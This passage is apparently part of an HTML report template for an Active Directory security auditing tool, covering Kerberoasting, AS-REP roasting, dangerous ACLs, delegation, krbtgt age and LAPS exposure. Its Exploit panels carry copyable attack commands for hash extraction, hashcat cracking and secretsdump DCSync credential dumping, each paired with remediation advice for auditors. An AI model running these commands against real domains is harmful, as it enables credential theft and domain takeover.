      <td style="white-space:nowrap">{{if .OperatingSystem}}{{.OperatingSystem}}{{else}}—{{end}}</td>
      <td class="mono" style="white-space:nowrap">
        {{if .OperatingSystemVersion}}{{.OperatingSystemVersion}}{{if .OperatingSystemSP}}&nbsp;{{.OperatingSystemSP}}{{end}}{{else}}—{{end}}
      </td>
      <td>{{if .Enabled}}<span class="txt-yes">✓</span>{{else}}—{{end}}</td>
      <td>{{if .LAPSEnabled}}<span class="txt-yes">✓</span>{{else}}—{{end}}</td>
      <td>{{if .UnconstrainedDelegation}}<span class="badge badge-critical">✓</span>{{else}}—{{end}}</td>
      <td class="mono">{{.LastLogon}}</td>
      <td class="mono">{{.WhenCreated}}</td>
      <td class="mono">{{.ChangedOn}}</td>
      <td class="mono">{{.CN}}</td>
      <td class="mono" style="font-size:0.75rem;color:var(--text-subtle)">{{.ObjectSid}}</td>
      <td style="color:var(--text-muted)">{{.Description}}</td>
    </tr>
    {{end}}
    </tbody>
  </table>
  </div>
</div>

<!-- KERBEROS TAB -->
<div id="tab-kerberos" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-kerberos" tabindex="0" aria-hidden="true">
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
    <h2 class="section-title" style="margin-bottom:0;border:none;flex:1;padding-bottom:0">Kerberos Attack Surface
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Kerberos is the primary authentication protocol in AD. Misconfigurations allow offline password cracking (Kerberoasting, AS-REP roasting) without triggering lockouts or alerts — attacker gets a hash and cracks it locally.">?</span>
    </h2>
    <div class="xp-btns">
      <button onclick="expandAllIn('#tab-kerberos')">Expand all</button>
      <button onclick="collapseAllIn('#tab-kerberos')">Collapse all</button>
    </div>
  </div>
  {{if .KerberosResult}}

  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Kerberoastable Accounts {{mitreBadges "kerberoasting"}}</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Accounts with a Service Principal Name (SPN) set. Any authenticated user can request a Kerberos ticket (TGS) for them and crack the hash offline. Severity rises sharply if the account has AdminCount=1 or is in a privileged group.">?</span>
      {{if .KerberosResult.KerberoastableAccounts}}
      <span class="badge badge-high" style="margin-left:auto">{{len .KerberosResult.KerberoastableAccounts}} accounts</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
    </div>
    <div class="exp-body">
    {{if .KerberosResult.KerberoastableAccounts}}
    <div style="padding:8px 0 16px">
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false">
        <span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span> — Kerberoasting
      </button>
      <div class="acc-body">
        <div class="acc-label">Exploit</div>
        <div class="acc-cmd-wrap"><code class="acc-cmd">GetUserSPNs.py domain/user:pass -dc-ip &lt;DC&gt; -request-user &lt;account&gt; -outputfile kerberoast.txt</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-label" style="margin-top:10px">Fix</div>
        <div style="color:var(--text-secondary)">Use managed service accounts (gMSA) — auto-rotating 120-char passwords, not crackable. Remove SPNs from regular user accounts. Enable AES-only Kerberos encryption (no RC4).</div>
      </div>
    </div>
    <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <th>Account</th>
          <th>Domain</th>
          <th>SPNs</th>
          <th>Admin</th>
          <th>CVSS</th>
          <th>Last Logon</th>
          <th>Password Last Set</th>
        </tr>
      </thead>
      <tbody>
      {{range .KerberosResult.KerberoastableAccounts}}
      <tr class="{{if .AdminCount}}row-critical{{else}}row-high{{end}}">
        <td class="mono">{{.SAMAccountName}}</td>
        <td class="mono" style="font-size:0.78rem;color:var(--text-muted)">{{.SourceDomain}}</td>
        <td class="mono" style="font-size:0.75rem">{{joinSPNs .SPNs}}</td>
        <td>{{if .AdminCount}}<span class="badge badge-critical">✓</span>{{else}}—{{end}}</td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
        <td class="mono">{{.LastLogon}}</td>
        <td class="mono">{{.PasswordLastSet}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">✓ No Kerberoastable accounts found.</p>{{end}}
    </div>
  </div>

  <div class="exp-section" style="margin-top:10px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">AS-REP Roastable Accounts {{mitreBadges "asrep"}}</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Accounts with 'Do not require Kerberos preauthentication' enabled. An attacker can request an AS-REP blob for these accounts without any credentials and crack the hash offline. No authentication required — works from outside the domain.">?</span>
      {{if .KerberosResult.ASREPAccounts}}
      <span class="badge badge-high" style="margin-left:auto">{{len .KerberosResult.ASREPAccounts}} accounts</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
    </div>
    <div class="exp-body">
    {{if .KerberosResult.ASREPAccounts}}
    <div style="padding:8px 0 16px">
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false">
        <span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span> — AS-REP Roasting
      </button>
      <div class="acc-body">
        <div class="acc-label">Exploit</div>
        <div class="acc-cmd-wrap"><code class="acc-cmd">GetNPUsers.py domain/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip &lt;DC&gt;</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-label" style="margin-top:10px">Fix</div>
        <div style="color:var(--text-secondary)">Enable "Do not require Kerberos preauthentication" only if absolutely needed. Enforce strong passwords (&gt;25 chars) on affected accounts. Add to Protected Users security group (prevents AS-REP roasting).</div>
      </div>
    </div>
    <div class="table-wrap">
    <table>
      <thead>
        <tr>
          <th>Account</th>
          <th>Domain</th>
          <th>Admin</th>
          <th>CVSS</th>
          <th>Last Logon</th>
          <th>Password Last Set</th>
        </tr>
      </thead>
      <tbody>
      {{range .KerberosResult.ASREPAccounts}}
      <tr class="{{if .AdminCount}}row-critical{{else}}row-high{{end}}">
        <td class="mono">{{.SAMAccountName}}</td>
        <td class="mono" style="font-size:0.78rem;color:var(--text-muted)">{{.SourceDomain}}</td>
        <td>{{if .AdminCount}}<span class="badge badge-critical">✓</span>{{else}}—{{end}}</td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
        <td class="mono">{{.LastLogon}}</td>
        <td class="mono">{{.PasswordLastSet}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">✓ No AS-REP Roastable accounts found.</p>{{end}}
    </div>
  </div>

  {{else}}<p style="color:var(--text-muted)">Kerberos data not available.</p>{{end}}
</div>

<!-- ACL TAB -->
<div id="tab-acl" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-acl" tabindex="0" aria-hidden="true">
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
    <h2 class="section-title" style="margin-bottom:0;border:none;flex:1;padding-bottom:0">
      Dangerous ACL Permissions
      <span>{{.Summary.DangerousACLCount}} finding(s)</span>
      {{mitreBadges "acl_abuse"}}
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Access Control Lists define who can do what to each AD object. Misconfigurations like GenericAll, WriteDACL or ForceChangePassword allow an attacker to take over accounts or escalate to Domain Admin without exploiting any software vulnerability — just abusing legitimate AD permissions.">?</span>
    </h2>
    <div class="xp-btns">
      <button onclick="expandAllIn('#tab-acl')">Expand all</button>
      <button onclick="collapseAllIn('#tab-acl')">Collapse all</button>
    </div>
  </div>

  {{if .ACLResult}}
  {{if or .ACLResult.Findings .ACLResult.DCSyncFindings}}
  <div class="filter-bar" style="margin-bottom:12px">
    <input type="text" id="acl-search" placeholder="Search principal or target..." oninput="filterACL()" style="min-width:220px">
    <select id="acl-severity" onchange="filterACL()">
      <option value="">Severity: all</option>
      <option value="Critical">Critical</option>
      <option value="High">High</option>
      <option value="Medium">Medium</option>
    </select>
    <select id="acl-right" onchange="filterACL()">
      <option value="">Right: all</option>
      <option value="DCSync">DCSync</option>
      <option value="GenericAll">GenericAll</option>
      <option value="WriteDACL">WriteDACL</option>
      <option value="WriteOwner">WriteOwner</option>
      <option value="ForceChangePassword">ForceChangePassword</option>
      <option value="AddMember">AddMember</option>
      <option value="GenericWrite">GenericWrite</option>
    </select>
    <select id="acl-domain" onchange="filterACL()">
      <option value="">Domain: all</option>
      {{range $.AllDomains}}<option value="{{.}}">{{.}}</option>{{end}}
    </select>
    <span class="filter-count" id="cnt-acl"></span>
    <button onclick="document.getElementById('acl-search').value='';document.getElementById('acl-severity').value='';document.getElementById('acl-right').value='';document.getElementById('acl-domain').value='';filterACL()">Clear</button>
  </div>
  <div id="acl-grouped"></div>
  <div id="acl-findings" style="display:none">
  {{range $i, $f := .ACLResult.Findings}}
  <div class="path-card acl-card" style="margin-bottom:10px" data-severity="{{$f.Severity}}" data-right="{{$f.Right}}" data-domain="{{$f.SourceDomain}}" data-text="{{$f.PrincipalName}} {{$f.TargetName}}">
    <div class="path-header" style="flex-wrap:wrap;gap:8px">
      <span class="badge {{if eq $f.Severity "Critical"}}badge-critical{{else if eq $f.Severity "High"}}badge-high{{else if eq $f.Severity "Medium"}}badge-medium{{else}}badge-ok{{end}}">{{$f.Severity}}</span>
      <span class="cvss-score" data-vector="{{$f.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" $f.CVSS}}</span>
      <span class="mono" style="color:var(--text-main)">{{$f.PrincipalName}}{{if $f.SourceDomain}}<span style="color:var(--text-muted);font-size:0.8rem">/{{$f.SourceDomain}}</span>{{end}}</span>
      <span style="color:var(--text-subtle)">─▶</span>
      <span class="mono" style="color:var(--text-sev-high)">{{$f.TargetName}}</span>
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{$f.PrincipalType}} → {{$f.TargetType}}</span>
    </div>
    <div style="padding:0 16px 16px">
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
      <div class="acc-body">
        <div class="acc-label">Exploit ({{$f.Right}})</div>
        <div class="acc-cmd-wrap"><code class="acc-cmd">{{aclExploit (print $f.Right) $f.PrincipalName $f.TargetName (coalesce $f.SourceDomain $.ACLResult.Domain)}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-label" style="margin-top:10px">Fix</div>
        <div style="color:var(--text-secondary)">{{aclFix (print $f.Right)}}</div>
      </div>
    </div>
  </div>
  {{end}}
  {{range .ACLResult.DCSyncFindings}}
  <div class="path-card acl-card" style="margin-bottom:10px" data-severity="Critical" data-right="DCSync" data-domain="{{.SourceDomain}}" data-text="{{.PrincipalName}}">
    <div class="path-header" style="flex-wrap:wrap;gap:8px">
      <span class="badge badge-critical">Critical</span>
      <span class="mono" style="color:var(--text-main)">{{.PrincipalName}}{{if .SourceDomain}}<span style="color:var(--text-muted);font-size:0.8rem">/{{.SourceDomain}}</span>{{end}}</span>
      <span style="color:var(--text-subtle)">─▶</span>
      <span class="mono" style="color:var(--text-sev-high)">Domain Root</span>
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary);margin-left:auto">{{.PrincipalType}} → Domain</span>
    </div>
    <div style="padding:0 16px 16px">
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
      <div class="acc-body">
        <div class="acc-label">Exploit (DCSync)</div>
        <div class="acc-cmd-wrap"><code class="acc-cmd">secretsdump.py DOMAIN/user:pass@DC -just-dc-ntlm</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-cmd-wrap" style="margin-top:4px"><code class="acc-cmd">secretsdump.py -hashes :&lt;NThash&gt; DOMAIN/user@DC -just-dc-ntlm</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-label" style="margin-top:10px">Fix</div>
        <div style="color:var(--text-secondary)">Remove DS-Replication-Get-Changes-All from non-DC accounts. Run: <code class="acc-cmd" style="display:inline">Get-ObjectAcl -DistinguishedName "DC=domain,DC=local" | ? {$_.ActiveDirectoryRights -match "Replication"}</code> to audit. Only Domain Controllers and Administrators should have DCSync rights.</div>
      </div>
    </div>
  </div>
  {{end}}
  </div>{{/* end acl-findings */}}
  {{else}}<p style="color:var(--color-ok)">✓ No dangerous ACL findings.</p>{{end}}

  {{if .ACLResult}}{{if .ACLResult.OwnerFindings}}
  <div class="exp-section" style="margin-top:16px">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Non-Default Owners</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="The owner of an AD object always has implicit WriteDACL — they can grant themselves any right. A non-default owner on a privileged object (DA group, GPO, DC) is an effective privilege escalation path.">?</span>
      <span class="badge badge-high" style="margin-left:auto">{{len .ACLResult.OwnerFindings}} finding(s)</span>
    </div>
    <div class="exp-body">
      <table class="report-table">
        <thead><tr><th>Severity</th><th>Target Object</th><th>Owner</th><th>CVSS</th></tr></thead>
        <tbody>
        {{range .ACLResult.OwnerFindings}}
        <tr>
          <td>{{if eq .Severity "Critical"}}<span class="badge badge-critical">Critical</span>{{else if eq .Severity "High"}}<span class="badge badge-high">High</span>{{else}}<span class="badge badge-medium">{{.Severity}}</span>{{end}}</td>
          <td class="mono">{{.TargetName}}</td>
          <td class="mono">{{.OwnerName}}</td>
          <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
        </tr>
        {{end}}
        </tbody>
      </table>
      <div class="acc-label" style="margin-top:10px">Fix</div>
      <div style="color:var(--text-secondary)">Review and restore default owner on each object:<br><code class="acc-cmd" style="display:inline">Set-ADObject -Identity '&lt;DN&gt;' -Replace @{nTSecurityDescriptor=...}</code> or use AD Users &amp; Computers → Object → Security → Advanced → Owner tab.</div>
    </div>
  </div>
  {{end}}{{end}}

  {{else}}<p style="color:var(--text-muted)">ACL data not available.</p>{{end}}
</div>

<!-- DELEGATION TAB -->
<div id="tab-delegation" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-delegation" tabindex="0" aria-hidden="true">
  <h2 class="section-title">
    Delegation Configurations
    <span>{{.Summary.DelegationCount}} finding(s)</span>
    <span class="help-icon" role="tooltip" tabindex="0" data-tip="Delegation allows a service to impersonate a user when accessing other services. Unconstrained delegation is the most dangerous — any account authenticating to that machine gives up their Kerberos ticket, which the attacker can reuse. Constrained and RBCD are less severe but still abusable.">?</span>
  </h2>
  {{if .DelegationResult}}
  {{if .DelegationResult.Findings}}
  {{range .DelegationResult.Findings}}
  <div class="path-card" style="margin-bottom:10px">
    <div class="path-header" style="flex-wrap:wrap;gap:8px">
      {{if eq .Severity "Critical"}}<span class="badge badge-critical">Critical</span>{{else if eq .Severity "High"}}<span class="badge badge-high">High</span>{{else}}<span class="badge badge-medium">{{.Severity}}</span>{{end}}
      <span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">{{.DelegationType}}</span>
      <span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span>
      <span class="mono" style="color:var(--text-main)">{{.SAMAccountName}}</span>
      <span class="badge" style="background:var(--bg-hover);color:var(--text-muted)">{{.ObjectType}}</span>
      {{mitreForDeleg (print .DelegationType)}}
      {{if .AllowedServices}}<span style="color:var(--text-muted);font-size:0.78rem">→ {{joinSPNs .AllowedServices}}</span>{{end}}
    </div>
    <div style="padding:4px 16px 16px">
      <div style="color:var(--text-sev-high);font-size:0.8rem;padding-bottom:4px">⚠ {{.RiskReason}}</div>
      <button class="acc-toggle" onclick="toggleAcc(this)" aria-expanded="false"><span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span></button>
      <div class="acc-body">
        <div class="acc-label">Exploit ({{.DelegationType}})</div>
        <div class="acc-cmd-wrap"><code class="acc-cmd">{{delegExploit (print .DelegationType)}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
        <div class="acc-label" style="margin-top:10px">Fix</div>
        <div style="color:var(--text-secondary)">{{delegFix (print .DelegationType)}}</div>
      </div>
    </div>
  </div>
  {{end}}
  {{else}}<p style="color:var(--color-ok)">✓ No dangerous delegation configurations.</p>{{end}}
  {{else}}<p style="color:var(--text-muted)">Delegation data not available.</p>{{end}}
</div>

<!-- EXPOSURE TAB -->
<div id="tab-exposure" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-exposure" tabindex="0" aria-hidden="true">
  <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;flex-wrap:wrap">
    <h2 class="section-title" style="margin-bottom:0;border:none;flex:1;padding-bottom:0">Exposure &amp; Attack Surface
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="Attack surface metrics: stale accounts are unused entry points, LAPS absence means shared local admin passwords enabling lateral movement, old krbtgt password enables persistent Golden Ticket attacks, descriptions often leak credentials or internal IP ranges.">?</span>
    </h2>
    <div class="xp-btns">
      <button onclick="expandAllIn('#tab-exposure')">Expand all</button>
      <button onclick="collapseAllIn('#tab-exposure')">Collapse all</button>
    </div>
  </div>

  <!-- krbtgt -->
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">krbtgt Password Age</span>
      <span class="help-icon" role="tooltip" tabindex="0" data-tip="The krbtgt account password hash signs all Kerberos tickets. If stolen (DCSync), attackers forge Golden Tickets valid for any user. Rotate every 180 days — must rotate TWICE to fully invalidate old tickets.">?</span>
      {{if .HygieneResult}}{{if .HygieneResult.KrbtgtAtRisk}}
      <span class="badge badge-critical">&#9888; Golden Ticket Risk</span>
      <span class="badge badge-critical" style="margin-left:auto">Critical</span>
      {{else if gt .HygieneResult.KrbtgtPwdAgeDays 0}}
      <span class="badge badge-ok">&#10003; OK — {{.HygieneResult.KrbtgtPwdAgeDays}} days</span>
      {{else}}<span class="badge" style="background:var(--bg-hover);color:var(--text-muted)">No data</span>
      {{end}}{{end}}
    </div>
    <div class="exp-body">
    {{if .HygieneResult}}
    {{if .HygieneResult.KrbtgtAtRisk}}
    <div style="display:flex;align-items:center;gap:16px;flex-wrap:wrap">
      <span class="badge badge-critical">&#9888; Golden Ticket Risk</span>
      <span style="color:var(--text-sev-critical);font-size:0.9rem">krbtgt password last changed <strong>{{.HygieneResult.KrbtgtPwdAgeDays}} days ago</strong> ({{.HygieneResult.KrbtgtLastSet}})</span>
      <div style="width:100%;font-size:0.8rem;color:var(--text-muted);margin-top:4px">Recommendation: reset krbtgt password twice (interval &gt;10h) to invalidate all existing Kerberos tickets</div>
    </div>
    {{else if gt .HygieneResult.KrbtgtPwdAgeDays 0}}
    <div style="display:flex;align-items:center;gap:12px">
      <span class="badge badge-ok">&#10003; OK</span>
      <span style="color:var(--color-ok);font-size:0.9rem">krbtgt password age: <strong>{{.HygieneResult.KrbtgtPwdAgeDays}} days</strong> ({{.HygieneResult.KrbtgtLastSet}})</span>
    </div>
    {{else}}
    <span style="color:var(--text-muted);font-size:0.85rem">krbtgt data not available</span>
    {{end}}
    {{end}}
    </div>
  </div>

  <!-- Descriptions -->
  {{if .HygieneResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Description Notes</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="AD objects whose description field contains keywords like 'password', 'pass', 'pwd', or 'secret'. Administrators often store credentials in descriptions — readable by any authenticated user.">?</span>
      {{if .HygieneResult.PasswordInDesc}}
      <span class="badge badge-medium" style="margin-left:auto">{{len .HygieneResult.PasswordInDesc}} objects</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; Clean</span>{{end}}
    </div>
    <div class="exp-body">
    <p style="color:var(--text-muted);font-size:0.8rem;margin-bottom:10px">All AD objects with a non-empty description. Admins often leave credentials, IP addresses, or other sensitive data here.</p>
    {{if .HygieneResult.PasswordInDesc}}
    <div class="table-wrap">
    <table id="tbl-desc">
      <thead><tr><th>Account</th><th>Type</th><th>Description</th></tr></thead>
      <tbody>
      {{range .HygieneResult.PasswordInDesc}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td><span class="badge" style="background:var(--bg-hover);color:var(--text-secondary)">{{.ObjectType}}</span></td>
        <td style="font-family:monospace;font-size:0.8rem;color:var(--text-main)">{{.Description}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">&#10003; No description attributes found.</p>{{end}}
    </div>
  </div>
  {{end}}

  <!-- Stale Users -->
  {{if .HygieneResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Stale User Accounts <span style="font-size:0.78rem;color:var(--text-muted);font-weight:400">(90+ days no logon)</span></span>
      {{if .HygieneResult.StaleUsers}}
      <span class="badge badge-medium" style="margin-left:auto">{{len .HygieneResult.StaleUsers}} accounts</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
    </div>
    <div class="exp-body">
    {{if .HygieneResult.StaleUsers}}
    <div class="table-wrap">
    <table id="tbl-stale-users">
      <thead><tr><th>Account</th><th>Display Name</th><th>Last Logon</th><th>Pwd Last Set</th><th>AdminCount</th></tr></thead>
      <tbody>
      {{range .HygieneResult.StaleUsers}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td>{{.DisplayName}}</td>
        <td class="mono" style="color:var(--text-sev-high)">{{if .LastLogon}}{{.LastLogon}}{{else}}Never{{end}}</td>
        <td class="mono">{{.PasswordLastSet}}</td>
        <td>{{if .AdminCount}}<span class="txt-warn">✓</span>{{else}}—{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">&#10003; No stale user accounts found.</p>{{end}}
    </div>
  </div>
  {{end}}

  <!-- Stale Computers -->
  {{if .HygieneResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Stale Computers <span style="font-size:0.78rem;color:var(--text-muted);font-weight:400">(45+ days no logon)</span></span>
      {{if .HygieneResult.StaleComputers}}
      <span class="badge badge-medium" style="margin-left:auto">{{len .HygieneResult.StaleComputers}} hosts</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
    </div>
    <div class="exp-body">
    {{if .HygieneResult.StaleComputers}}
    <div class="table-wrap">
    <table id="tbl-stale-comp">
      <thead><tr><th>Computer</th><th>OS</th><th>Last Logon</th><th>Domain</th></tr></thead>
      <tbody>
      {{range .HygieneResult.StaleComputers}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td>{{.OperatingSystem}}</td>
        <td class="mono" style="color:var(--text-sev-high)">{{if .LastLogon}}{{.LastLogon}}{{else}}Never{{end}}</td>
        <td style="font-size:0.78rem;color:var(--text-muted)">{{.Domain}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">&#10003; No stale computers found.</p>{{end}}
    </div>
  </div>
  {{end}}

  <!-- No LAPS -->
  {{if .HygieneResult}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">Computers Without LAPS</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Local Administrator Password Solution (LAPS) rotates local admin passwords per machine. Without it, the same local admin password often exists across all hosts — one compromise leads to mass lateral movement (pass-the-hash).">?</span>
      {{if gt .Summary.NoLAPSCount 0}}
      <span class="badge badge-medium" style="margin-left:auto">{{.Summary.NoLAPSCount}} / {{.Summary.TotalComputers}} hosts</span>
      {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; All managed</span>{{end}}
    </div>
    <div class="exp-body">
    {{if gt .Summary.NoLAPSCount 0}}
    <div style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:12px">Local Administrator Password Solution not deployed — local admin passwords may be identical across machines, enabling lateral movement.</div>
    <div class="table-wrap">
    <table id="tbl-nolaps">
      <thead><tr><th>Computer</th><th>OS</th><th>Domain</th><th>Last Logon</th></tr></thead>
      <tbody>
      {{range .HygieneResult.NoLAPSComputers}}
      <tr>
        <td class="mono">{{.SAMAccountName}}</td>
        <td>{{.OperatingSystem}}</td>
        <td style="font-size:0.78rem;color:var(--text-muted)">{{.Domain}}</td>
        <td class="mono" style="color:var(--text-secondary)">{{if .LastLogon}}{{.LastLogon}}{{else}}Never{{end}}</td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}<p style="color:var(--color-ok)">&#10003; All enabled computers have LAPS deployed.</p>{{end}}
    </div>
  </div>
  {{end}}

  <!-- LAPS ACL -->
  {{if .LAPSACLResult}}{{if .LAPSACLResult.LAPSFound}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">LAPS Password Read Access</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Checks who has ReadProperty rights on ms-Mcs-AdmPwd (LAPS local admin password attribute) on each LAPS-enabled computer. Any non-privileged principal with this right can retrieve the local administrator password — equivalent to local admin access on that machine.">?</span>
      {{if .LAPSACLResult.Findings}}
      <span class="badge badge-high" style="margin-left:auto">{{len .LAPSACLResult.Findings}} finding(s)</span>
      {{else}}
      <span class="badge badge-ok" style="margin-left:auto">&#10003; No unexpected access</span>
      {{end}}
    </div>
    <div class="exp-body">
    {{if .LAPSACLResult.Findings}}
    <p style="color:var(--text-secondary);font-size:0.85rem;margin-bottom:12px">Non-privileged principals with read access to LAPS passwords. Each finding means the principal can retrieve the local Administrator password of that computer — use <code style="font-size:0.8rem;background:var(--bg-card);padding:1px 4px;border-radius:3px">Get-AdmPwdPassword</code> or <code style="font-size:0.8rem;background:var(--bg-card);padding:1px 4px;border-radius:3px">crackmapexec --laps</code>.</p>
    <div class="table-wrap">
    <table id="tbl-laps-acl">
      <thead><tr><th>Principal</th><th>Type</th><th>Computer</th><th>Right</th><th>CVSS</th></tr></thead>
      <tbody>
      {{range .LAPSACLResult.Findings}}
      <tr>
        <td class="mono">{{.PrincipalName}}</td>
        <td>{{.PrincipalType}}</td>
        <td class="mono" style="color:var(--text-secondary)">{{.ComputerName}}</td>
        <td><span class="badge badge-high">{{.Right}}</span></td>
        <td><span class="cvss-score" data-vector="{{.CVSSVector}}" onclick="copyCVSS(this)" data-tip="CVSS:3.1 — click to copy">{{printf "%.1f" .CVSS}}</span></td>
      </tr>
      {{end}}
      </tbody>
    </table>
    </div>
    {{else}}
    <p style="color:var(--color-ok)">&#10003; No non-privileged principals have read access to LAPS passwords.</p>
    {{end}}
    </div>
  </div>
  {{end}}{{end}}

  <!-- gMSA Password Readers -->
  {{if .LAPSACLResult}}{{if .LAPSACLResult.GMSAFindings}}
  <div class="exp-section">
    <div class="exp-header" onclick="toggleExpSection(this)">
      <span class="chevron">▼</span>
      <span class="exp-title">gMSA Password Readers</span> <span class="help-icon" role="tooltip" tabindex="0" data-tip="Principals listed in msDS-GroupMSAMembership can retrieve the gMSA managed password via GetPassword(). If the gMSA is in a privileged group, this is a direct privilege escalation path.">?</span>
      <span class="badge badge-high" style="margin-left:auto">{{len .LAPSACLResult.GMSAFindings}} finding(s)</span>
    </div>
    <div class="exp-body">
    <div class="table-wrap">
    <table>
      <thead><tr><th>Principal</th><th>Type</th><th>gMSA Account</th><th>Severity</th><th>CVSS</th></tr></thead>
      <tbody>
      {{range .LAPSACLResult.GMSAFindings}}
      <tr>
        <td class="mono">{{.PrincipalName}}</td>
        <td>{{.PrincipalType}}</td>
        <td class="mono" style="color:var(--text-secondary)">{{.GMSAName}}</td>
        <td><span class="badge badge-{{lower .Severity}}">{{.Severity}}</span></td>
